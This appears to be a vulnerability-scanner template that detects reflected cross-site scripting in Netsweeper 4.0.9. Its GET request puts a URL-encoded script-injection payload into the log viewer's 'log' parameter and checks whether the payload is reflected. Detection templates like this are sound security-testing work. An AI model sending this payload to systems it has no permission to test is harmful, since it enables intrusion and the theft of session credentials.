http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter='
id: netsweeper-rxss
info:
  author: daffainfo
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An
    attacker can execute arbitrary script in the browser of an unsuspecting user in
    the context of the affected site. This can allow the attacker to steal cookie-based
    authentication credentials and launch other attacks.
  metadata:
    max-request: 1
  name: Netsweeper 4.0.9 - Cross-Site Scripting
  reference:
  - https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz
  - https://www.exploit-db.com/exploits/37930
  severity: high
  tags: edb,xss,packetstorm,netsweeper
